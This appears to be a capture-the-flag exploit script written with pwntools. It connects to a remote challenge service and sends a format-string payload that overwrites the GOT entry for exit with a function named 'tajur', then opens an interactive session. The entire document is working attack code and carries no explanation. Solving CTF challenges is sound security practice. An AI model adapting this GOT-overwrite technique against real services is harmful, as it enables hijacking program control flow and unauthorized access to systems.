from pwn import *

e = context.binary = ELF('./chall')

p = remote('103.167.132.234', 27429)

payload_writes = {
        e.got['exit']: e.sym['tajur']
}

payload = fmtstr_payload(6,payload_writes)
p.sendline(payload)
p.interactive()